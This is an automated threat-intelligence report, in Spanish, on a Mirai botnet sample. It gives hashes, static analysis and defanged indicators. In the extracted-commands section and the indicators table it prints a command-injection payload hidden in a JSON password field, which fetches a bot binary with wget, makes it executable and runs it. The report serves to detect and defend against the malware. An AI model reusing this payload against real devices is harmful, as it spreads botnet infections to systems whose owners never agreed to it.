# 🧬 Payload Analysis

`35fb45ac455a57a16327bf870a83a00d3c43dff515be5aef8bc81bdf122c4a0b`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos. Se identificó 1 comando observado o extraído. Se identificaron 12 indicadores técnicos. **Ficha malware:** [malware-like/oraculo/botnet/35fb45ac455a57a16327bf870a83a00d3c43dff515be5aef8bc81bdf122c4a0b.md](../../../../../malware-like/oraculo/botnet/35fb45ac455a57a16327bf870a83a00d3c43dff515be5aef8bc81bdf122c4a0b.md)


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:10:14.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `35fb45ac455a57a16327bf870a83a00d3c43dff515be5aef8bc81bdf122c4a0b`
- **SHA1:** `14316e84c312c4fb34bc1d64208b14ef0fddd969`
- **MD5:** `66cfcfb450c1f6f32d96ffc543eae36b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (869), with CRLF line terminators |
| Tamaño | 1.0 KiB |
| Entropía | 5.08 |
| Strings | 7 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (869), with CRLF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
{"password":"$(wget -q -O /tmp/bot_x86_64 hxxp://184.174.96.XXX:8114/bot.x86_64; chmod +x /tmp/bot_x86_64; /tmp/bot_x86_
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://184.174.96.XXX:8114/bot.x86_64; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.armv5l; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.mipsel; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.mips; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.armv7; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.i386; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.armv4; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.armv6; | strings |
| ip | 184.174.96.XXX | static_analysis |
| ip | 190.179.172.XXX | static_analysis |
| command | {"password":"$(wget -q -O /tmp/bot_x86_64 hxxp://184.174.96.XXX:8114/bot.x86_64; chmod +x /tmp/bot_x86_64; /tmp/bot_x86_ | strings |
| hash | 35fb45ac455a57a16327bf870a83a00d3c43dff515be5aef8bc81bdf122c4a0b | static_analysis |
| ip | 204.76.203.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
